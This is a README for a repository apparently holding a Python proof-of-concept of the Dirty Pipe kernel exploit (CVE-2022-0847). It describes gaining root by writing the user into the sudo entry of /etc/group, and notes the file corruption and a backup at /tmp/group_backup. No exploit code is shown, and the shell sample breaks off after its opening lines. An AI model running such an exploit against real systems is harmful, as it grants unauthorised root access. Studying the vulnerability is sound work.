# POC Exploit to add user to Sudo for CVE-2022-0847 Dirty Pipe Vulnerability

This repo is based of the Vulnerability, Writeup and Exploit produced by Max Kellermann all found [here](https://dirtypipe.cm4all.com/).

Just like everyone I had to take advantage of playing with the worlds most trivial to repro Priv Esc the blog post does a great job of explaining it all.

I translated the exploit into python simply to get a better feel for it, but this is an exact copy of the C exploit with the Sudo Priv esc hardcoded in.

## Requires
Python 3.10 (due to use of os.splice call)

## Bad bits
Corrupts the /etc/group file by writing into the line directly following the sudo entry. But when you are root you can fix this using the copy.

Places a copy of /etc/group at /tmp/group_backup

```sh
test@kali:/home/user/working$ whoami

test is not in the sudoers file.  This incident will be reported.
